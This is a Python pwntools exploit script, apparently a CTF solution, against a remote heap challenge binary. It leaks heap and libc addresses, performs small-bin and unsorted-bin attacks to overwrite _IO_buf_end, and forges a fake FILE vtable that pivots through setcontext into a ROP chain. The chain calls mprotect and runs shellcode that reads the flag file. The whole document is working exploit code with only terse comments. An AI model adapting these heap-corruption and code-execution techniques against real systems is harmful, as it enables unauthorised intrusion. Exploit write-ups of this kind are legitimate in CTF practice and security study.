from pwn import*
#p = process('./sf14')
p = remote('35.194.245.237',8094)
context(arch = 'amd64', os = 'linux')

t = 0.05
# def
def menu(sel):
        p.sendlineafter('>> ',str(sel));sleep(t)

def add(name):
        menu(1)
        p.sendafter(' : ',name);sleep(t)

def make(name,idx,ing):
        cnt = 0
        menu(2)
        p.sendafter(' : ',name);sleep(t)
        p.sendlineafter(' : ',str(idx));sleep(t)
        for i in ing:
                cnt+=1
                p.sendlineafter(' : ','y');sleep(t)
                p.sendlineafter('>> ',str(i));sleep(t)
        if cnt != 7:
                p.sendlineafter(' : ','n')

def delete(idx):
        menu(3)
        p.sendlineafter(' : ',str(idx))

# gadget


### exploit
# heap leak
delete(1)                       # mixed id = 1 free (existed)
add('A'*0x10)                   # default[3]
menu(2)                         # make
p.sendafter(' : ','a'*4)        # name
p.sendlineafter(' : ','1')      # mixed id = 1 malloc
p.sendlineafter(' : ','y')      # y/n
p.recvuntil('A'*0x10)
heap_base = u64(p.recv(6).ljust(8,'\x00')) -0x10
log.info("heap_base : {}".format(hex(heap_base)))
p.sendlineafter('>> ','0')
p.sendlineafter(' : ','n')

# libc leak
delete(1)                       # mixed id = 1 free
delete(2)                       # mixed id = 2 free (existed)
make('b'*4,2,[])                # mixed id = 2 malloc
delete(2)                       # mixed id = 2 free
delete(0)                       # default id = 0 fake free
make('c'*4,3,[])                # mixed id = 3 malloc build up
make('d'*4,4,[])                # mixed id = 4 malloc
delete(4)                       # mixed id = 4 free

menu(2)                         # make
p.sendlineafter(' : ','0')      # name : point fake size
p.sendlineafter(' : ','5')      # mixed id = 5
p.sendlineafter(' : ','y')      # y/n
p.recvuntil('[2] ')

main_arena_88 = u64(p.recv(6).ljust(8,'\x00'))
libc_base = main_arena_88 - 3951496
log.info("main_arena : {}".format(hex(main_arena_88)))
log.info("libc_base : {}".format(hex(libc_base)))
p.sendlineafter('>> ','0');sleep(t)
p.sendlineafter(': ','n');sleep(t)
delete(str(main_arena_88))

# small bin attack + unsorted bin attack
io_buf_end = libc_base + 3950880
add(p64(main_arena_88)+p64(heap_base+0x1a0))            # default[4]   : fake chunk a
make(p64(heap_base+0x40)[:7],str(heap_base+0x230),[])   # fake chunk b ; 0x1a0
make(p64(heap_base+0x1a0)[:7],str(main_arena_88),[])    # fake chunk c : 0x230
add('C'*0x8+p64(heap_base+0x1a0))# default[5]   : 0x1a0 in small bin
delete(str(heap_base+0x230))     # mixed id = 8 : 0x1a0 in unsorted bin
add('D'*0x8+p64(io_buf_end-0x10))# default[6]   : 0x1a0's bk = io_buf_end-0x10
make('e'*4,6,[])                 # mixed id = 9 : [io_buf_end] = main_arena_88

# setcontext ROP
ret = libc_base + 0x937
pop_rdi = libc_base + 0x21102
pop_rsi = libc_base + 0x202e8
pop_rdx = libc_base + 0x1b92
pop_rax = libc_base + 0x33544
syscall = libc_base + 0xf727b
setcontext_53 = libc_base + 0x47b40 + 53

shellcode = ''
shellcode += shellcraft.pushstr("/home/sf14/flag")
shellcode += shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)

rop = ''
rop += p64(pop_rdi)
rop += p64(libc_base)
rop += p64(pop_rsi)
rop += p64(0x9000000)
rop += p64(pop_rdx)
rop += p64(7)
rop += p64(pop_rax)
rop += p64(10)                  # sys_mprotect
rop += p64(syscall)
rop += p64(0)
rop += p64(libc_base+0x3c4a18)  # shellcode addr
rop += asm(shellcode)
rop += '\x90'*(0xe0-(len(rop)))

pay = ''
pay += '\x00'*5                 # fake setting
pay += p64(libc_base+0x3c6790)
pay += p64(0xffffffffffffffff)
pay += p64(0)
pay += p64(libc_base+0x3c49c0)  # rsp = IO_wide_data+0x0
pay += p64(ret)                 # push rcx controll
pay += p64(0)*2
pay += p64(0xffffffff)
pay += p64(0)*2
pay += p64(libc_base+0x3c4aa0)  # vtable_addr -> IO_wide_data+0x208
pay += rop
pay += p64(setcontext_53)*20    # fake vtable overwrited setcontext gadget

p.send(pay)
p.interactive()

